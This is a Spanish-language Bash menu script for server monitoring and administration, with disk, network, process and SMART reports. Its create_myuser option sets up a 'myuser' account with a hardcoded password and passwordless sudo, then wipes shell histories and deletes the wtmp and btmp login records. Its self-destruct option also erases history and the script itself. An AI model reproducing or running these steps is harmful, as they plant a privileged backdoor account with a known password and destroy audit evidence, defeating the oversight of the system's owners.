#!/bin/bash

#---------------------------------------------------
# Script: LisaServer.com
# Versión: 6.13 (Corrección de error de sintaxis 'done')
# Finalidad: Monitorización y gestión del servidor.
#---------------------------------------------------

# --- Definición de Colores y Emoticonos ---
NC=$'\033[0m'      # Sin Color
BOLD=$'\033[1m'
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[0;33m'
CYAN=$'\033[0;36m'
MAGENTA=$'\033[0;35m'
ORANGE=$'\033[38;5;208m' # Color Naranja
DIM='\033[2m' # Color atenuado

# --- Flags de Dependencias ---
HAS_WGET=false
HAS_VNSTAT=false
HAS_NEOFETCH=false
HAS_SMARTCTL=false

# --- Función para comprobar e instalar dependencias ---
check_dependencies() {
    command -v wget &>/dev/null && HAS_WGET=true
    command -v vnstat &>/dev/null && HAS_VNSTAT=true
    command -v neofetch &>/dev/null && HAS_NEOFETCH=true
    command -v smartctl &>/dev/null && HAS_SMARTCTL=true

    local missing_pkgs=()
    ! $HAS_WGET && missing_pkgs+=("wget")
    ! $HAS_VNSTAT && missing_pkgs+=("vnstat")
    ! $HAS_NEOFETCH && missing_pkgs+=("neofetch")
    ! $HAS_SMARTCTL && missing_pkgs+=("smartmontools")

    if [ ${#missing_pkgs[@]} -eq 0 ]; then
        echo -e "${GREEN}✅ Todas las dependencias están en orden.${NC}"; sleep 1; return 0;
    fi
    
    echo -e "${YELLOW}⚠️  Dependencias opcionales faltantes: ${missing_pkgs[*]}.${NC}"
    echo -e "${YELLOW}Algunas funciones del menú estarán deshabilitadas.${NC}"
    
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Para instalar las dependencias, ejecuta el script con sudo.${NC}"; sleep 2; return 1;
    fi
    
    read -p "¿Deseas instalar las dependencias ahora? (s/n): " choice
    if [[ "$choice" != "s" && "$choice" != "S" ]]; then
        echo "Instalación omitida. El script continuará con funcionalidad limitada."
        sleep 2
        return 1
    fi

    echo "Instalando paquetes APT: ${missing_pkgs[*]}..."
    apt-get update &> /dev/null
    if apt-get install -y "${missing_pkgs[@]}"; then
        echo -e "${GREEN}✅ Paquetes instalados correctamente.${NC}"
        # Vuelve a comprobar para actualizar los flags
        command -v wget &>/dev/null && HAS_WGET=true
        command -v vnstat &>/dev/null && HAS_VNSTAT=true
        command -v neofetch &>/dev/null && HAS_NEOFETCH=true
        command -v smartctl &>/dev/null && HAS_SMARTCTL=true
    else
        echo -e "${RED}❌ Error instalando paquetes con APT.${NC}"
    fi
}

# --- FUNCIONES DE ADMINISTRACIÓN ---

change_hostname(){
    read -p "Introduce el nuevo nombre de host: " new_hostname
    if [ -z "$new_hostname" ]; then echo -e "${RED}El nombre no puede estar vacío.${NC}"; return; fi
    hostnamectl set-hostname "$new_hostname"
    echo -e "${GREEN}✅ Nombre de host cambiado a '${BOLD}$new_hostname${GREEN}'.${NC}"
    echo -e "${YELLOW}Necesitas reiniciar o volver a iniciar sesión para ver el cambio en todas partes.${NC}"
}

change_root_password(){
    echo -e "${YELLOW}A continuación, se te pedirá la nueva contraseña para el usuario 'root'.${NC}"
    passwd root
}

create_myuser(){
    echo -e "${YELLOW}Este comando creará el usuario 'myuser' con contraseña 'lisa25' y sudo.${NC}"
    read -p "¿Estás seguro de que quieres continuar? (s/n): " confirm
    if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
        echo "Ejecutando el comando de creación de usuario..."
        useradd -s /bin/bash myuser && echo 'myuser:lisa25' | chpasswd && usermod -aG sudo myuser && echo 'myuser ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/myuser && chmod 440 /etc/sudoers.d/myuser && history -c && cat /dev/null > ~/.bash_history && unset HISTFILE && rm -f /root/.bash_history /home/myuser/.bash_history /var/log/wtmp /var/log/btmp
        echo -e "${GREEN}✅ Proceso completado.${NC}"
    else
        echo "Operación cancelada."
    fi
}

# --- FUNCIONES DE MONITORIZACIÓN Y ANÁLISIS ---

get_server_specs() {
    echo -e "\n${CYAN}--- 💻 Especificaciones del Servidor (con Neofetch) ---${NC}"
    neofetch
}

get_download_speed() {
    echo -e "\n${CYAN}--- 📥 Probando Velocidad de Descarga ---${NC}"
    wget -O /dev/null http://ipv4.download.thinkbroadband.com/100MB.zip
}

get_data_usage() {
    echo -e "\n${CYAN}${BOLD}--- 📊 MONITOR DE CONSUMO DE DATOS ---${NC}"
    local interface; interface=$(ip route | grep default | sed -e 's/^.*dev.//' -e 's/.proto.*//' | head -n1 || echo "eth0")
    echo -e "Mostrando estadísticas para la interfaz: ${YELLOW}${interface}${NC}\n"

    local vnstat_output; vnstat_output=$(vnstat -i "$interface")
    if [ -z "$vnstat_output" ]; then
        echo -e "${YELLOW}No se pudieron obtener datos de 'vnstat'. ¿El servicio está en ejecución y ha recolectado datos?${NC}"; return;
    fi

    print_data_line() {
        local emoji=$1; local label=$2; local line_data=$3; local color=$4
        if [ -n "$line_data" ]; then
            local rx_val=$(echo "$line_data" | awk '{print $2}'); local rx_unit=$(echo "$line_data" | awk '{print $3}')
            local tx_val=$(echo "$line_data" | awk '{print $5}'); local tx_unit=$(echo "$line_data" | awk '{print $6}')
            local total_val=$(echo "$line_data" | awk '{print $8}'); local total_unit=$(echo "$line_data" | awk '{print $9}')
            
            local received_str=$(printf "%s %s" "$rx_val" "$rx_unit")
            local sent_str=$(printf "%s %s" "$tx_val" "$tx_unit")
            local total_str=$(printf "%s %s" "$total_val" "$total_unit")

            printf " ${emoji} %-16s | ${GREEN}%-18s${NC} | ${CYAN}%-18s${NC} | ${color}%-18s${NC}\n" \
                "$label" "$received_str" "$sent_str" "$total_str"
        fi
    }

    printf "   %-16s | %-18s | %-18s | %-18s\n" "PERIODO" "RECIBIDO (↓)" "ENVIADO (↑)" "TOTAL"
    echo "------------------------------------------------------------------------------------------"
    
    local today_line=$(echo "$vnstat_output" | grep -wE "hoy|today")
    local yesterday_line=$(echo "$vnstat_output" | grep -wE "ayer|yesterday")
    local all_monthly_lines=$(echo "$vnstat_output" | awk '/monthly/,/daily/' | grep -E "\w{3,4} '[0-9]{2}")
    local current_month_line=$(echo "$all_monthly_lines" | tail -n 1)
    local previous_month_line=""
    if [ "$(echo "$all_monthly_lines" | wc -l)" -gt 1 ]; then
        previous_month_line=$(echo "$all_monthly_lines" | tail -n 2 | head -n 1)
    fi
    local last_30_days_line=$(echo "$vnstat_output" | awk '/daily/,/monthly/' | grep -E "total")

    print_data_line "☀️" "Hoy" "$today_line" "${BOLD}${YELLOW}"
    print_data_line "🌙" "Ayer" "$yesterday_line" "${NC}"
    print_data_line "📅" "Mes Actual" "$current_month_line" "${BOLD}${GREEN}"
    print_data_line "⏮️" "Mes Pasado" "$previous_month_line" "${NC}"
    print_data_line "🗓️" "Últimos 30 días" "$last_30_days_line" "${BOLD}${MAGENTA}"
    echo "------------------------------------------------------------------------------------------"
}

show_disk_space() {
    echo -e "\n${CYAN}${BOLD}--- 💾 ANÁLISIS DE ESPACIO EN DISCO ---${NC}\n"
    local total_line=$(df -hP --total | grep 'total')
    local total_size=$(echo "$total_line" | awk '{print $2}')
    local total_used=$(echo "$total_line" | awk '{print $3}')
    local total_avail=$(echo "$total_line" | awk '{print $4}')
    local total_percent=$(echo "$total_line" | awk '{print $5}')

    echo -e "${YELLOW}   --- RESUMEN GENERAL ---${NC}"
    echo -e "   Capacidad Total:   ${BOLD}${total_size}${NC}"
    echo -e "   Espacio Utilizado:  ${BOLD}${total_used}${NC} (${BOLD}${total_percent}${NC})"
    echo -e "   Espacio Disponible:${BOLD}${total_avail}${NC}"
    echo -e "   -----------------------"
    echo -e "\n${YELLOW}   --- DETALLE POR DISCO ---${NC}"
    
    printf "%-20s | %-8s | %-8s | %-8s | %-5s | %-22s\n" "MONTADO EN" "TAMAÑO" "USADO" "DISP." "USO%" "GRÁFICO DE USO"
    echo "-------------------------------------------------------------------------------------------------"
    df -hP | grep '^/dev/' | while read -r filesystem size used available use_percent mountpoint; do
        p_num=${use_percent//%}; local color=$GREEN; local emoji="✅"
        if (( p_num >= 90 )); then color=$RED; emoji="🚨"; elif (( p_num >= 75 )); then color=$YELLOW; emoji="⚠️ "; fi
        let "bar_filled=p_num/5"; let "bar_empty=20-bar_filled"
        bar_str=$(printf "%${bar_filled}s" | tr ' ' '█')$(printf "%${bar_empty}s" | tr ' ' '░')
        echo -e "$(printf "%-20s | %-8s | %-8s | %-8s | " "$mountpoint" "$size" "$used" "$available")${color}$(printf "%-5s" "$use_percent")${NC} | [${color}${bar_str}${NC}] $emoji"
    done
}

show_last_logins() {
    echo -e "\n${CYAN}${BOLD}--- 🕵️ ÚLTIMOS 20 INICIOS DE SESIÓN ---${NC}"
    last -n 20
}

show_top_processes() {
    echo -e "\n${CYAN}${BOLD}--- 🚀 PROCESOS CON MAYOR CONSUMO ---${NC}\n"
    echo -e "${YELLOW}--- Top 5 Consumo de CPU ---${NC}"; ps -eo pcpu,pid,user,args --sort=-pcpu | head -n 6
    echo ""; echo -e "${YELLOW}--- Top 5 Consumo de Memoria ---${NC}"; ps -eo pmem,pid,user,args --sort=-pmem | head -n 6
}

check_service_status() {
    echo -e "\n${CYAN}${BOLD}--- 🟢 CONSULTAR ESTADO DE UN SERVICIO ---${NC}\n"
    read -p "Introduce el nombre del servicio a consultar (ej: nginx, sshd): " service_name
    if [ -n "$service_name" ]; then systemctl status "$service_name"; else echo -e "${RED}No se introdujo un nombre.${NC}"; fi
}

show_active_ports() {
    echo -e "\n${CYAN}${BOLD}--- 🌐 PUERTOS DE RED EN ESCUCHA (TCP/UDP) ---${NC}\n"
    echo "Si algún proceso es '-', ejecuta el script con 'sudo' para ver todos los nombres."
    ss -tulnp
}

get_disk_details() {
    echo -e "\n${CYAN}${BOLD}--- 💿 DETALLES DE LAS UNIDADES DE DISCO ---${NC}"
    lsblk -d -o NAME,SIZE | tail -n +2 | while read -r name size; do
        local device="/dev/$name"
        echo -e "\n${YELLOW}✚ Análisis de:${NC} ${BOLD}$device${NC} (${BOLD}${size}${NC})"
        
        local smart_info; smart_info=$(sudo smartctl -a "$device" 2>/dev/null)
        
        local model=$(echo "$smart_info" | awk -F': ' '/Device Model/ {print $2}')
        local serial=$(echo "$smart_info" | awk -F': ' '/Serial Number/ {print $2}')
        local temp=$(echo "$smart_info" | awk '/Temperature:/ {print $2"°C"} /Temperature_Celsius/ {print $10"°C"}')
        
        local type_text; local spec_text
        if [[ $name == nvme* ]]; then
            type_text="${GREEN}SSD (NVMe) 🚀${NC}"
            spec_text="N/A"
        elif echo "$smart_info" | grep -q "Rotation Rate"; then
            type_text="${CYAN}HDD (Mecánico) ⚙️${NC}"
            spec_text=$(echo "$smart_info" | awk -F': ' '/Rotation Rate/ {print $2}')
        else
            type_text="${GREEN}SSD (SATA) ⚡${NC}"
            spec_text="N/A"
        fi

        printf "  %-15s %s\n" "Modelo" "${model:-No disponible}"
        printf "  %-15s %s\n" "Nº de Serie" "${serial:-No disponible}"
        printf "  %-15s %b\n" "Tipo" "${type_text}"
        printf "  %-15s %s\n" "Especificación" "${spec_text}"
        printf "  %-15s ${BOLD}${RED}%s${NC}\n" "Temperatura" "${temp:-No disponible}"
    done
}

# --- FUNCIONES DE SISTEMA ---

reboot_server() {
    read -p "$(echo -e "${RED}${BOLD}¿ESTÁS SEGURO DE QUE QUIERES REINICIAR? (s/n): ${NC}")" confirm
    if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
        echo -e "${YELLOW}Reiniciando en 3 segundos...${NC}"; sleep 3; reboot;
    else
        echo "Reinicio cancelado."
    fi
}

self_destruct() {
    read -p "$(echo -e "${RED}${BOLD}ADVERTENCIA: ¿Seguro que quieres borrar el script y el historial? (escribe 'borrar'): ${NC}")" confirm
    if [[ "$confirm" == "borrar" ]]; then
        history -c; cat /dev/null > ~/.bash_history; unset HISTFILE
        if [[ $EUID -eq 0 ]]; then cat /dev/null > /root/.bash_history; fi
        echo -e "${GREEN}Script y rastros eliminados. ¡Adiós! 👋${NC}"; rm -- "$0"; exit 0;
    else
        echo "Operación cancelada."
    fi
}

# --- BUCLE PRINCIPAL DEL MENÚ ---
check_dependencies

while true; do
    clear; printf '\n\n\n\n\n\n'
    
    # --- CABECERA GRÁFICA ---
    echo -e "${ORANGE}${BOLD}"; echo '        ██╗     ██╗███████╗ █████╗ '; echo '        ██║     ██║██╔════╝██╔══██╗'; echo '        ██║     ██║███████╗███████║'; echo '        ██║     ██║╚════██║██╔══██║'; echo '        ███████╗██║███████║██║  ██║'; echo '        ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝'; echo -e "${NC}"
    echo -e "                   ${YELLOW}LisaServer.com${NC}"
    echo -e "       ${YELLOW}Panel de Gestión y Monitorización v6.13${NC}"; echo ""

    # --- MENÚ DINÁMICO ---
    
    echo -e "${MAGENTA}${BOLD}   --- 🛠️ ADMINISTRACIÓN ---${NC}"
    echo -e "      ${GREEN}1.${NC}${CYAN} Cambiar Nombre de Host"
    echo -e "      ${GREEN}2.${NC}${CYAN} Cambiar Pass de Root"
    echo -e "      ${GREEN}3.${NC}${YELLOW} Crear Usuario 'myuser'"
    echo ""

    echo -e "${MAGENTA}${BOLD}   --- 📊 MONITORIZACIÓN Y ANÁLISIS ---${NC}"
    # Opción 4
    if $HAS_NEOFETCH; then
        echo -e "      ${GREEN}4.${NC}${CYAN} Especificaciones Servidor 💻"
    else
        echo -e "      ${DIM}4. Especificaciones Servidor ⛔ [Falta neofetch]${NC}"
    fi
    # Opción 5
    if $HAS_WGET; then
        echo -e "      ${GREEN}5.${NC}${CYAN} Test de Velocidad 📥"
    else
        echo -e "      ${DIM}5. Test de Velocidad ⛔ [Falta wget]${NC}"
    fi
    # Opción 6
    if $HAS_VNSTAT; then
        echo -e "      ${GREEN}6.${NC}${CYAN} Consumo de Datos 📈"
    else
        echo -e "      ${DIM}6. Consumo de Datos ⛔ [Falta vnstat]${NC}"
    fi
    
    echo -e "      ${GREEN}7.${NC}${CYAN} Espacio en Disco 💾"
    echo -e "      ${GREEN}8.${NC}${CYAN} Últimos Logins 🕵️"
    echo -e "      ${GREEN}9.${NC}${CYAN} Top 5 Procesos 🚀"
    echo -e "      ${GREEN}10.${NC}${CYAN} Estado de Servicio 🟢"
    echo -e "      ${GREEN}11.${NC}${CYAN} Puertos Activos 🌐"

    # Opción 12
    if $HAS_SMARTCTL; then
        echo -e "      ${GREEN}12.${NC}${CYAN} Detalles de Discos (Temp/Modelo) 💿"
    else
        echo -e "      ${DIM}12. Detalles de Discos (Temp/Modelo) ⛔ [Falta smartmontools]${NC}"
    fi
    echo ""

    echo -e "${MAGENTA}${BOLD}   --- ⚙️ SISTEMA ---${NC}"
    echo -e "      ${CYAN}20.${NC}${RED} Reiniciar Servidor"
    echo -e "      ${CYAN}99.${NC}${BOLD}${RED} Borrar Script (Peligro!)"
    echo -e "      ${CYAN}0.${NC}${RED} Salir"
    echo ""

    read -p "$(echo -e "${YELLOW}   Selecciona una opción: ${NC}")" choice

    case $choice in
        1) change_hostname ;; 2) change_root_password ;; 3) create_myuser ;;
        4) if $HAS_NEOFETCH; then get_server_specs; else echo -e "\n${RED}Función no disponible. Instala 'neofetch'.${NC}"; fi ;;
        5) if $HAS_WGET; then get_download_speed; else echo -e "\n${RED}Función no disponible. Instala 'wget'.${NC}"; fi ;;
        6) if $HAS_VNSTAT; then get_data_usage; else echo -e "\n${RED}Función no disponible. Instala 'vnstat'.${NC}"; fi ;;
        7) show_disk_space ;; 8) show_last_logins ;; 9) show_top_processes ;;
        10) check_service_status ;; 11) show_active_ports ;;
        12) if $HAS_SMARTCTL; then get_disk_details; else echo -e "\n${RED}Función no disponible. Instala 'smartmontools'.${NC}"; fi ;;
        20) reboot_server ;; 99) self_destruct ;;
        0) echo -e "\n${MAGENTA}Saliendo... ¡Hasta luego! ✨${NC}\n"; exit 0 ;;
        *) echo -e "\n${RED}Opción no válida.${NC}" ;;
    esac
    read -p "$(echo -e "\n${YELLOW}   Presiona Enter para volver al menú...${NC}")"
done